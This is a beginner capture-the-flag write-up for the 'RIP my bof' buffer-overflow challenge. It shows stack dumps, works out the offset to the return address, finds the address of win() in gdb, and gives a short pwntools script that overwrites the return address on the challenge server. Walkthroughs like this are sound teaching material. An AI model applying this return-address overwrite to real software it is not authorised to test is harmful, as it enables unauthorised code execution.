# RIP my bof  (Easy)
challenge link: https://ctflearn.com/challenge/1011


## Writeup
We got a buffer overflow, and the point of the challenge is to change the return address of `vul()` to `win()`. The challenge is very begginer friendly
, it prints the state of the stack for us which makes it much easier.
```
  return address MODIFIED
0xff864350 | 00 00 00 00 00 00 00 00 |
0xff864358 | 00 00 00 00 00 00 00 00 |
0xff864360 | 00 00 00 00 00 00 00 00 |
0xff864368 | 00 00 00 00 00 00 00 00 |
0xff864370 | ff ff ff ff ff ff ff ff |
0xff864378 | ff ff ff ff ff ff ff ff |
0xff864380 | c0 65 ee f7 00 a0 04 08 |
0xff864388 | 98 43 86 ff 8b 86 04 08 |
Return address: 0x0804868b
```
the last 4 byes are the return address in little endian. By counting lines and multpilying by columns we get the amout of bytes in here. 8 * 8 = 64,
let's check it by typing 64 bytes.
```
Input some text: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED                                                                                                                                   
  return address MODIFIED                                                                                                                                              
0xffedd2f0 | 61 61 61 61 61 61 61 61 |
0xffedd2f8 | 61 61 61 61 61 61 61 61 |
0xffedd300 | 61 61 61 61 61 61 61 61 |
0xffedd308 | 61 61 61 61 61 61 61 61 |
0xffedd310 | 61 61 61 61 61 61 61 61 |
0xffedd318 | 61 61 61 61 61 61 61 61 |
0xffedd320 | 61 61 61 61 61 61 61 61 |
0xffedd328 | 61 61 61 61 61 61 61 61 |
Return address: 0x61616161
```
Alright. Now we can change the return address. We got the binary provided so let's run gdb and see what is the address for `win()`, and here it is.

`0x8048586 <win>                         push   ebp`

Now it's just about writing a script to run it, I will use pwntools.
```
from pwn import *

add = 0x8048586
io = remote('thekidofarcrania.com', 4902)
io.sendline(b'a'*60 + p32(add))
print(io.recv().decode())
io.interactive()
```
